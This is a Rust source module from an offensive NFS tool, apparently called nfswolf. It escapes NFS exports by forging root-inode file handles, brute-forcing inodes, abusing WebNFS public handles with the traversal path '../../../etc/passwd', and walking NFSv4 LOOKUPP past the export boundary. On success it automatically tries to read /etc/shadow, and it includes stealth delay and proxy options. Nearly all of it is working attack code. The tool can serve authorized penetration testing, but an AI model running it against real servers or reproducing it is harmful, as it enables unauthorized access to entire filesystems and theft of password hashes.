//! Export escape: construct a root file handle for the underlying
//! filesystem and verify it live.
//!
//! Most NFS exports trust the file handle the client presents (RFC 1094
//! S2.3.3 -- handles are bearer tokens). When the server does not validate
//! that a handle's inode falls inside the export's subtree, an attacker
//! can construct a handle pointing at the filesystem root (ext4 inode 2,
//! XFS inode 128, BTRFS subvolume 256, etc.) and read/write anything on
//! the underlying filesystem. This module is the single entry point for
//! that primitive: it prints a hex root handle which the operator passes
//! to `shell --handle` or any other module that takes `--handle HEX`.

use clap::Parser;
use colored::Colorize as _;

use crate::cli::probe::{acquire_and_test_handles, make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::escape::{EscapeConfig, EscapeProbe, EscapeRootOutcome, find_escape_root, find_escape_root_all};
use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, dedup_variants, derive_handle_variants};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::circuit::CircuitBreaker;
use crate::proto::conn::ReconnectStrategy;
use crate::proto::nfs3::types::FileHandle;
use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
use crate::proto::pool::{ConnectionPool, PoolKey};
use crate::proto::transport::PooledTransport;
use crate::util::stealth::StealthConfig;
use nfs_v3::FileType;

/// Escape an export to the filesystem root via subtree_check bypass.
///
/// Tries to reach the filesystem root outside the exported directory by
/// constructing a file handle with the root inode (ext4: 2, XFS: 128/64,
/// BTRFS: 256+). The server accepts the handle without verifying it is
/// within the export boundary.
///
/// Strategy (automatic, no flags needed):
///   1. Probe known root inodes for the detected filesystem type.
///   2. If those return STALE, scan inodes 2-200 -- the root is always there.
///   3. For BTRFS, enumerate subvolume IDs starting at 256.
///
/// The printed handle is verified live (GETATTR returns NFS3_OK or ACCES,
/// not STALE) before being shown. Pass it to `shell --handle` to browse
/// the full filesystem.
///
/// Examples:
///   nfswolf escape 192.168.1.10:/srv
///   nfswolf escape 192.168.1.10 --export /srv --btrfs-subvols 32
#[derive(Parser)]
pub(crate) struct EscapeArgs {
    /// Target host with optional :/export suffix (e.g. 10.0.0.5:/srv)
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export in the positional target)
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Number of BTRFS subvolume IDs to try (starting at 256)
    #[arg(long, default_value_t = DEFAULT_BTRFS_SUBVOLS, value_name = "N", help_heading = H_BEHAVIOR)]
    pub btrfs_subvols: u32,

    /// Inode scan depth for the fallback brute-force pass.
    /// The root inode is always within the first 200 inodes on any Linux
    /// filesystem, so the default covers all practical cases.
    #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_root_scan: u32,

    /// Try ALL handle sources (MOUNT v3, MOUNT v1, NFSv4 LOOKUP) and
    /// report every working root handle instead of stopping at the first.
    #[arg(long, help_heading = H_BEHAVIOR)]
    pub all: bool,
}

/// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
/// auto pass uses the same depth as a manual `escape` invocation.
pub(crate) const DEFAULT_BTRFS_SUBVOLS: u32 = 16;

/// Default inode-scan depth for the escape fallback pass. The root inode is
/// always within the first 200 inodes on any Linux filesystem. Shared with
/// `scan --auto-escape`.
pub(crate) const DEFAULT_MAX_ROOT_SCAN: u32 = 200;

/// Outcome of an escape attempt against a single export.
///
/// Returned by [`find_escape`] so callers decide how to render it: the `escape`
/// subcommand prints a verbose report (and reads /etc/shadow on success), while
/// `scan --auto-escape` prints a one-line-per-export summary.
#[derive(Debug)]
pub(crate) enum EscapeOutcome {
    /// A filesystem-root handle was constructed and verified live (GETATTR
    /// returned NFS3_OK on a directory, or ACCES -- format accepted).
    Success {
        /// The verified root handle plus its filesystem fingerprint.
        candidate: EscapeResult,
        /// How the handle was found (e.g. "verified", "found via scan").
        note: String,
    },
    /// WebNFS public handle accepted -- MOUNT bypass confirmed via
    /// multi-component LOOKUP path traversal (RFC 2054 sec. 5, 6;
    /// C702 Appendix E).  The server processes slash-delimited paths in a
    /// single LOOKUP against the well-known public handle, bypassing the
    /// MOUNT protocol entirely.
    WebNfs {
        /// The public handle the server accepted (zero-length for v3,
        /// all-zero 32 bytes for v2).
        public_handle: FileHandle,
        /// NFS version that accepted the public handle.
        version: &'static str,
    },
    /// NFSv4 LOOKUPP traversal escape -- walked above the export boundary
    /// by chaining parent-directory lookups (RFC 7530 S16.14).
    ///
    /// Two sub-cases depending on `verified`:
    ///
    /// **`verified = true`** -- the handle points at the real filesystem root
    /// (LOOKUP of `/etc`, `/bin`, etc. succeeded). This is a full escape:
    /// the handle works in both v3 and v4 and gives access to the entire
    /// underlying filesystem, not just the export.
    ///
    /// **`verified = false`** -- LOOKUPP crossed the export boundary but
    /// landed in the NFSv4 pseudo-filesystem (RFC 7530 S7.3). Linux knfsd
    /// redirects LOOKUPP at the export boundary into the pseudo-FS instead
    /// of the host filesystem, so the handle is a pseudo-root -- valid only
    /// in NFSv4 (v3 returns NFS3ERR_STALE). The escape gives cross-export
    /// access (navigate into any export on the server) but not full
    /// filesystem access.
    Nfs4Lookupp {
        root_handle: FileHandle,
        /// `true` when LOOKUP of a well-known top-level directory (`etc`,
        /// `bin`, ...) succeeded from the handle -- confirming it is the
        /// real filesystem root, not the NFSv4 pseudo-root.
        verified: bool,
    },
    /// Handle format is valid (STALE hits) but the root inode was not found
    /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
    StaleNoRoot,
    /// The server rejected the handle format entirely (BADHANDLE): the export
    /// is not escapable with this technique (non-Linux server, signed handles).
    Unsupported,
}

/// Run the escape command.
pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    let target = crate::cli::target::parse(&args.target, args.export.as_deref(), None, true)?;
    let host = target.host.to_string();
    let export = target.export().unwrap_or("/").to_owned();

    if args.all {
        run_all(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
    } else {
        run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
    }
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Single-result escape: try every method, print the first success.
///
/// Cascade: WebNFS -> v3 MOUNT -> handle matrix -> v2 MOUNT -> v4 handle -> v4 LOOKUPP.
/// Delegates to `find_escape_any` for the cascade logic, then handles output.
async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));

    let outcome = find_escape_any(host, export, btrfs_subvols, max_root_scan, globals, true).await?;

    match outcome {
        EscapeOutcome::Success { ref candidate, ref note } => {
            print_escape_success(candidate, note, host);
            // Attempt post-escape /etc/shadow read via v3 (best-effort).
            let addr = parse_addr_with_port(host, globals.nfs_port).ok();
            if let Some(addr) = addr {
                let stealth = StealthConfig::new(globals.delay, globals.jitter);
                let (_, _, client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
                try_read_shadow_post_escape(&client, &candidate.root_handle).await;
            }
        },
        EscapeOutcome::WebNfs { ref public_handle, version } => print_webnfs_success(public_handle, version, host),
        EscapeOutcome::Nfs4Lookupp { ref root_handle, verified } => print_nfs4_lookupp_success(root_handle, verified, host),
        EscapeOutcome::StaleNoRoot => {
            eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
        },
        EscapeOutcome::Unsupported => {
            eprintln!("{}", crate::output::status_err("Export escape not available -- the server rejected the handle format (BADHANDLE / non-Linux)"));
        },
    }
    Ok(())
}

/// A seed handle with its source label (used by `--all` mode).
struct EscapeSeed {
    handle: FileHandle,
    source: String,
}

/// A successful root handle with the seed that produced it (used by `--all` mode).
struct AllEscapeResult {
    candidate: EscapeResult,
    seed_source: String,
}

/// Comprehensive multi-seed escape: acquire handles from ALL available sources
/// (MOUNT v3, MOUNT v1, NFSv4 LOOKUP), run `find_escape_root_all` on each unique
/// seed, and report every working root handle.
///
/// Unlike `run_inner` (first-success-wins), this mode is exhaustive: it tests
/// every seed against the full escape algorithm and collects all verified root
/// handles. Useful for mapping the full attack surface of an export.
async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
    use std::collections::HashSet;

    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export} (--all: comprehensive multi-seed mode)")));

    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mount = make_mount_client(globals);
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // --- Collect seed handles from all available sources ---

    let mut seeds: Vec<EscapeSeed> = Vec::new();
    let mut seen_seed_bytes: HashSet<Vec<u8>> = HashSet::new();

    // Source 1: MOUNT v3
    stealth.wait().await;
    match mount.mount(addr, export).await {
        Ok(mnt) => {
            let label = format!("MOUNT v3 ({} bytes)", mnt.handle.len());
            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", mnt.handle.to_hex())));
            if seen_seed_bytes.insert(mnt.handle.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: mnt.handle, source: label });
            }
        },
        Err(e) => eprintln!("{}", crate::output::status_warn(&format!("  MOUNT v3 failed: {e}"))),
    }

    // Source 2: MOUNT v1
    stealth.wait().await;
    match mount.mount_v1(addr, export).await {
        Ok(mnt) => {
            let label = format!("MOUNT v1 ({} bytes)", mnt.handle.len());
            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", mnt.handle.to_hex())));
            if seen_seed_bytes.insert(mnt.handle.as_bytes().to_vec()) {
                seeds.push(EscapeSeed { handle: mnt.handle, source: label });
            }
        },
        Err(e) => eprintln!("{}", crate::output::status_warn(&format!("  MOUNT v1 failed: {e}"))),
    }

    // Source 3: NFSv4 LOOKUP -- navigate the pseudo-FS into the export.
    if let Some(fh) = acquire_v4_lookup_handle(host, export, globals).await {
        let label = format!("NFSv4 LOOKUP ({} bytes)", fh.len());
        eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", fh.to_hex())));
        if seen_seed_bytes.insert(fh.as_bytes().to_vec()) {
            seeds.push(EscapeSeed { handle: fh, source: label });
        }
    } else {
        eprintln!("{}", crate::output::status_warn("  NFSv4 LOOKUP failed"));
    }

    if seeds.is_empty() {
        eprintln!("{}", crate::output::status_err("No seed handles acquired from any source -- export may not exist or server is unreachable"));
        return Ok(());
    }

    eprintln!("{}", crate::output::status_info(&format!("{} unique seed handle(s) acquired", seeds.len())));

    // --- Build probe clients ---

    let direct_port = globals.nfs_port.unwrap_or(2049);
    let (_, _, v3_probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
    let v3_probe = Nfs3EscapeProbe { client: &v3_probe_client };
    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce: true };

    // --- Run find_escape_root_all on each seed via v3, collecting all results ---

    let mut all_results: Vec<AllEscapeResult> = Vec::new();
    let mut seen_root_bytes: HashSet<Vec<u8>> = HashSet::new();

    for seed in &seeds {
        eprintln!();
        eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} ...", seed.source)));

        let hits = find_escape_root_all(&v3_probe, seed.handle.as_bytes(), &config).await;
        for hit in hits {
            if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
                all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
            }
        }
    }

    // --- If v3 found nothing, retry all seeds via v2 probe ---
    // v2-only servers (kernel 2.6.x) reject v3 GETATTR with PROG_MISMATCH;
    // the v2 probe speaks the right protocol version.
    if all_results.is_empty() {
        let (_, _, v2_probe_client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
        let v2_probe = Nfs2EscapeProbe { client: &v2_probe_client };

        eprintln!();
        eprintln!("{}", crate::output::status_info("v3 probe found nothing -- retrying seeds with NFSv2 probe"));

        for seed in &seeds {
            eprintln!();
            eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} (v2 probe) ...", seed.source)));

            let hits = find_escape_root_all(&v2_probe, seed.handle.as_bytes(), &config).await;
            for hit in hits {
                if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
                    all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
                }
            }
        }
    }

    // --- Also try NFSv4 LOOKUPP as a structurally different escape ---

    let v4_lookupp = try_nfs4_escape(host, export, globals).await;

    // --- Print report ---

    println!();
    println!("  {}", "Handle sources:".bold());
    for seed in &seeds {
        println!("    {:20} {}", seed.source, seed.handle.to_hex().dimmed());
    }

    if all_results.is_empty() && v4_lookupp.is_none() {
        println!();
        eprintln!("{}", crate::output::status_err("No root handles found from any seed source"));
        return Ok(());
    }

    if !all_results.is_empty() {
        println!();
        println!("  {}", "Results:".bold());
        for r in &all_results {
            println!("    {}  {:?} inode {}  via {}  handle: {}", "[+]".bold().green(), r.candidate.fs_type, r.candidate.inode_number, r.seed_source.dimmed(), r.candidate.root_handle.to_hex().cyan());
        }
    }

    if let Some(EscapeOutcome::Nfs4Lookupp { ref root_handle, verified }) = v4_lookupp {
        println!();
        if verified {
            println!("    {}  NFSv4 LOOKUPP filesystem root  handle: {}", "[+]".bold().green(), root_handle.to_hex().cyan());
        } else {
            println!("    {}  NFSv4 LOOKUPP pseudo-root (cross-export, v4 only)  handle: {}", "[+]".bold().green(), root_handle.to_hex().cyan());
        }
    }

    let total = all_results.len() + usize::from(v4_lookupp.is_some());
    println!();
    println!("  {} root handle(s) found from {} seed source(s).", total.to_string().bold(), seeds.len());

    // Print next steps for the first root handle
    if let Some(first) = all_results.first() {
        let hex = first.candidate.root_handle.to_hex();
        crate::output::print_handle_next_steps(&hex, host);
    } else if let Some(EscapeOutcome::Nfs4Lookupp { ref root_handle, .. }) = v4_lookupp {
        let hex = root_handle.to_hex();
        crate::output::print_handle_next_steps(&hex, host);
    }
    println!();

    Ok(())
}

/// Acquire a seed handle via NFSv4 LOOKUP into the export path.
///
/// Connects to port 2049, navigates PUTROOTFH -> LOOKUP chain to the export
/// path components, then GETFH to retrieve the file handle. This handle has
/// the correct fsid for the export's filesystem and can serve as an escape
/// seed even when MOUNT is firewalled.
async fn acquire_v4_lookup_handle(host: &str, export: &str, globals: &GlobalOpts) -> Option<FileHandle> {
    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;

    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let nfs_port = globals.nfs_port.unwrap_or(2049);

    // Build the same PooledTransport the shell uses --this handles auth
    // context correctly across export junction crossings.
    let pool = std::sync::Arc::new(match &globals.proxy {
        Some(p) => ConnectionPool::with_proxy(p.clone()),
        None => ConnectionPool::default_config(),
    });
    let circuit = std::sync::Arc::new(CircuitBreaker::default_config());
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let gids = crate::cli::probe::build_gid_list(globals.gid, &globals.aux_gids);
    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
    let pool_key = PoolKey { host: addr, export: format!("__v4_escape__{nfs_port}"), uid: globals.uid, gid: globals.gid };
    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
    let client = PooledNfs4Client::new(transport);

    // Navigate component-by-component. The pooled transport handles auth
    // context at each junction --same as the shell's `cd` command.
    let components = crate::proto::sideband::export_components(export);
    let mut fh = client.get_root_fh().await.ok()?;
    let root_fh = fh.clone();
    for comp in &components {
        match client.lookup(fh.as_slice(), comp).await {
            Ok((child, _)) => fh = child,
            Err(_) => break,
        }
    }
    if fh == root_fh {
        return None; // didn't leave the pseudo-root
    }
    Some(FileHandle::from_bytes(&fh))
}

/// Try NFSv3 escape first, then NFSv2 fallback, then NFSv4 LOOKUPP.
/// Returns just the outcome (no client). Used by `scan --auto-escape`
/// which doesn't need the client for post-escape reads.
pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
    // Phase 0: WebNFS public handle probe -- one LOOKUP, no MOUNT needed.
    if let Some(outcome) = try_webnfs_escape(host, globals).await {
        return Ok(outcome);
    }
    let outcome = match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
        Ok((_client, o)) => o,
        Err(_) => {
            // Handle matrix: try v1+v3 handles with all length variants.
            if let Some((_client, o)) = find_escape_matrix(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
                o
            } else {
                match find_escape_v2(host, export, max_root_scan, globals).await {
                    Ok(o) => o,
                    Err(_) => {
                        // v3 and v2 MOUNT both failed. Try NFSv4 handle construction
                        // (acquire seed via v4 LOOKUP, probe via v4 GETATTR).
                        match find_escape_v4(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
                            Ok(o @ EscapeOutcome::Success { .. }) => return Ok(o),
                            _ => return Ok(try_nfs4_escape(host, export, globals).await.unwrap_or(EscapeOutcome::Unsupported)),
                        }
                    },
                }
            }
        },
    };

    // If v3/v2 handle construction didn't succeed, try v4 LOOKUPP as a
    // fundamentally different escape mechanism before giving up.
    match outcome {
        EscapeOutcome::Success { .. } | EscapeOutcome::WebNfs { .. } | EscapeOutcome::Nfs4Lookupp { .. } => Ok(outcome),
        EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
            if let Some(v4) = try_nfs4_escape(host, export, globals).await {
                Ok(v4)
            } else {
                Ok(outcome)
            }
        },
    }
}

/// Try WebNFS public handle escape (RFC 2054 sec. 5, 6; C702 Appendix E).
///
/// WebNFS defines well-known "public" file handles that bypass MOUNT:
/// - NFSv3: zero-length opaque (empty `nfs_fh3`)
/// - NFSv2: all-zero 32 bytes (`[0u8; 32]`)
///
/// A multi-component LOOKUP sends an entire slash-delimited path in one LOOKUP
/// call against the public handle.  A WebNFS server splits the name at `/`
/// boundaries; a non-WebNFS server rejects the filename (contains `/`) and we
/// fall through.  One LOOKUP call per version -- cheap and non-destructive.
async fn try_webnfs_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // Multi-component LOOKUP: slashes in a single LOOKUP name are what makes
    // this "multi-component" -- the WebNFS server splits them (C702 App. E).
    let traversal = "../../../etc/passwd";

    // NFSv3: zero-length FileHandle is the WebNFS public handle (RFC 2054 sec. 6).
    let (_, _, v3_client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
    let public_v3 = FileHandle::from_bytes(&[]);
    if v3_client.resolve(&public_v3, traversal).await.is_ok() {
        tracing::info!("WebNFS public handle accepted on NFSv3 -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: public_v3, version: "v3" });
    }

    // NFSv2: all-zero 32-byte handle is the WebNFS public handle (RFC 2054 sec. 5).
    let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
    let public_v2 = nfs_v2::Nfs2FileHandle([0u8; 32]);
    if v2_client.lookup(&public_v2, traversal).await.is_ok() {
        tracing::info!("WebNFS public handle accepted on NFSv2 -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&public_v2.0), version: "v2" });
    }

    // NFSv4: PUTPUBFH sets the current FH to the server's public handle (op 23,
    // RFC 7530 S16.21). Follow with a multi-component LOOKUP of a traversal path
    // and GETFH. If the server processes the traversal, the public handle with
    // path traversal works -- MOUNT bypass confirmed.
    if let Some(outcome) = try_webnfs_v4(addr, traversal, globals.proxy.as_deref()).await {
        return Some(outcome);
    }

    None
}

/// NFSv4 public filehandle probe: PUTPUBFH -> LOOKUP(traversal) -> GETFH.
///
/// RFC 7530 S16.21 defines PUTPUBFH (op 23) as the v4 analogue of the WebNFS
/// public handle. If the server accepts the compound and returns a file handle,
/// the public FH with path traversal is confirmed -- no MOUNT needed.
async fn try_webnfs_v4(addr: std::net::SocketAddr, traversal: &str, proxy: Option<&str>) -> Option<EscapeOutcome> {
    use crate::proto::nfs4::compound::Nfs4DirectClient;
    use crate::proto::nfs4::types::{ArgOp, ResOpData};

    // Connect with AUTH_SYS uid=0 (most servers require at least AUTH_SYS).
    let mut client = match Nfs4DirectClient::connect_with_auth_proxy(addr, 0, 0, "localhost", proxy).await {
        Ok(c) => c,
        Err(_) => match Nfs4DirectClient::connect_proxy(addr, proxy).await {
            Ok(c) => c,
            Err(_) => return None,
        },
    };

    // NFSv4 LOOKUP processes one component at a time (no slashes), but
    // PUTPUBFH per RFC 7530 S16.21.5 allows the server to apply multi-component
    // lookup rules when the name contains slashes, similar to WebNFS for v2/v3.
    // Try the traversal as a single LOOKUP name first (slash-aware servers split it),
    // then fall back to component-by-component LOOKUPs for the same path.
    let ops = vec![ArgOp::Putpubfh, ArgOp::Lookup(traversal.to_owned()), ArgOp::Getfh];
    if let Ok(res) = client.compound(ops).await
        && res.status == 0
        && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
    {
        tracing::info!("WebNFS public handle accepted on NFSv4 (single LOOKUP) -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&fh_data), version: "v4" });
    }

    // Component-by-component: PUTPUBFH -> LOOKUP("..") -> LOOKUP("..") -> ... -> LOOKUP("etc") -> LOOKUP("passwd") -> GETFH
    let components: Vec<&str> = traversal.split('/').filter(|c| !c.is_empty()).collect();
    let mut ops = Vec::with_capacity(components.len() + 2);
    ops.push(ArgOp::Putpubfh);
    for comp in &components {
        ops.push(ArgOp::Lookup((*comp).to_owned()));
    }
    ops.push(ArgOp::Getfh);
    if let Ok(res) = client.compound(ops).await
        && res.status == 0
        && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
    {
        tracing::info!("WebNFS public handle accepted on NFSv4 (component LOOKUP) -- MOUNT bypass confirmed");
        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&fh_data), version: "v4" });
    }

    None
}

/// Print a WebNFS escape success report.
fn print_webnfs_success(public_handle: &FileHandle, version: &str, host: &str) {
    let hex = public_handle.to_hex();
    println!();
    println!("  {}  WebNFS public handle accepted -- MOUNT bypass (NFS{version})", "[+]".bold().green());
    println!("  {}  Multi-component LOOKUP path traversal confirmed (RFC 2054; C702 App. E)", "    ".dimmed());
    if hex.is_empty() {
        // NFSv3 zero-length handle: print a hint rather than an empty string.
        crate::output::print_handle("Public handle", "(zero-length -- pass empty string to --handle)");
    } else {
        crate::output::print_handle("Public handle", &hex);
    }
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// Adapts `Nfs3Client` to the version-neutral `EscapeProbe` trait so the shared
/// escape engine can probe handles through NFSv3.
use crate::engine::escape::Nfs3EscapeProbe;

/// NFSv2 escape probe: wraps an `Nfs2Client` so the escape engine can
/// probe candidate handles on v2-only servers (kernel 2.6.x, no v3/v4).
struct Nfs2EscapeProbe<'a> {
    client: &'a crate::proto::nfs2::Nfs2Client,
}

impl EscapeProbe for Nfs2EscapeProbe<'_> {
    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
        let fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(handle);
        let attrs = self.client.getattr(&fh).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok((attrs.ftype == nfs_v2::wire::FType::Directory, u64::from(attrs.fileid)))
    }

    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
        let fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(dir);
        let (child, _) = self.client.lookup(&fh, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok(child.0.to_vec())
    }
}

/// NFSv4 escape probe: wraps a pooled `Nfs4Client` so the escape engine
/// can probe candidate handles via NFSv4 COMPOUND (GETATTR / LOOKUP).
struct Nfs4EscapeProbe {
    client: crate::proto::nfs4::Nfs4Client,
}

impl EscapeProbe for Nfs4EscapeProbe {
    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
        let info = self.client.getattr(handle).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        let is_dir = info.ftype == Some(nfs_v4::Nfs4FileType::Directory);
        Ok((is_dir, info.fileid.unwrap_or(0)))
    }

    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
        let (fh, _) = self.client.lookup(dir, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
        Ok(fh)
    }
}

/// NFSv4-only export escape: acquire seed via v4 LOOKUP, probe via v4 GETATTR.
///
/// This is the fallback when MOUNT (v3) and MOUNT v1 (v2) are both unreachable
/// (firewalled or server is NFSv4-only). Uses the same PooledTransport as the
/// v4 shell so export junction crossings work correctly.
async fn find_escape_v4(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;

    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let nfs_port = globals.nfs_port.unwrap_or(2049);

    if announce {
        eprintln!("{}", crate::output::status_info(&format!("Trying NFSv4 handle escape on {host}:{nfs_port}")));
    }

    // Build a pooled v4 transport --same as the shell, so junction crossings work.
    let pool = std::sync::Arc::new(match &globals.proxy {
        Some(p) => ConnectionPool::with_proxy(p.clone()),
        None => ConnectionPool::default_config(),
    });
    let circuit = std::sync::Arc::new(CircuitBreaker::default_config());
    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let gids = crate::cli::probe::build_gid_list(globals.gid, &globals.aux_gids);
    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
    let pool_key = PoolKey { host: addr, export: format!("__v4_escape__{nfs_port}"), uid: globals.uid, gid: globals.gid };
    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
    let client = PooledNfs4Client::new(transport);

    // Navigate the pseudo-FS to the export path, component by component.
    let components = crate::proto::sideband::export_components(export);
    let mut fh = client.get_root_fh().await.map_err(|e| anyhow::anyhow!("NFSv4 PUTROOTFH: {e}"))?;
    let root_fh = fh.clone();
    for comp in &components {
        match client.lookup(fh.as_slice(), comp).await {
            Ok((child, _)) => fh = child,
            Err(_) => break,
        }
    }
    if fh == root_fh {
        anyhow::bail!("NFSv4 LOOKUP could not navigate into the export");
    }

    if announce {
        use std::fmt::Write as _;
        let fh_hex = fh.iter().fold(String::new(), |mut s, b| {
            let _ = write!(s, "{b:02x}");
            s
        });
        eprintln!("{}", crate::output::status_info(&format!("NFSv4 seed handle ({} bytes): {fh_hex}", fh.len())));
    }

    // Probe candidates using NFSv4 GETATTR (not v3 --the handle's fsid
    // may only be valid in the v4 export context).
    let probe = Nfs4EscapeProbe { client };
    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce };
    let seed = FileHandle::from_bytes(&fh);

    match find_escape_root(&probe, seed.as_bytes(), &config).await {
        EscapeRootOutcome::Success(result) => Ok(EscapeOutcome::Success { candidate: result, note: "NFSv4 handle escape".to_owned() }),
        EscapeRootOutcome::StaleNoRoot => Ok(EscapeOutcome::StaleNoRoot),
        EscapeRootOutcome::Unsupported => Ok(EscapeOutcome::Unsupported),
    }
}

/// NFSv3 export-escape primitive.
///
/// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
/// filesystem-root handle (ext4/XFS known inodes first, then BTRFS subvolumes, then a
/// fallback inode scan). Returns the probe client -- so the caller can perform
/// post-escape reads such as /etc/shadow -- together with the [`EscapeOutcome`].
///
/// Per-candidate progress lines are written to stderr only when `announce` is
/// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
/// one-line-per-export summary instead.
pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<(Nfs3Client, EscapeOutcome)> {
    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mount = make_mount_client(globals);
    let mnt = mount.mount(addr, export).await?;

    // Honour the global stealth delay on the probe path (every RPC path must
    // respect StealthConfig); with the default --delay 0 this is a no-op.
    // `globals.nfs_port` routes the probe client straight to the NFS port when
    // portmapper is firewalled.
    let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], StealthConfig::new(globals.delay, globals.jitter), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);

    let probe = Nfs3EscapeProbe { client: &probe_client };
    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce };

    let engine_outcome = find_escape_root(&probe, mnt.handle.as_bytes(), &config).await;

    match engine_outcome {
        EscapeRootOutcome::Success(result) => Ok((probe_client, EscapeOutcome::Success { candidate: result, note: "verified".to_owned() })),
        EscapeRootOutcome::StaleNoRoot => {
            // The engine's brute-force pass cannot switch credentials (EscapeProbe
            // has no credential API), so ACCES hits during the scan are left
            // unconfirmed. Re-probe ACCES candidates with the root_squash anon
            // identity (uid/gid 65534) to catch the case where root_squash blocks
            // uid=0 but the handle IS the filesystem root (mode 0755, traversable
            // by nobody).
